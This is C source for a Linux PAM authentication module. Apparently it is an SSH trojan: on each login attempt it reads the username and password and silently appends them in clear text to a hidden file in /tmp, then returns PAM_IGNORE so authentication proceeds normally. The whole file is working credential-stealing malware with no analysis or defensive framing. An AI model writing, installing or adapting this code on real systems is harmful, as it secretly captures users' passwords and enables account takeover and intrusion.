#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user;
    const char *password;
    FILE *f;

    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS) {
        return PAM_IGNORE;
    }

    if (pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password) != PAM_SUCCESS) {
        return PAM_IGNORE;
    }

    if (user && password) {
        f = fopen("/tmp/.log_sshtrojan1.txt", "a");
        if (f) {
            fprintf(f, "User: %s | Pass: %s\n", user, password);
            fclose(f);
        }
    }

    return PAM_IGNORE; 
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) { return PAM_SUCCESS; }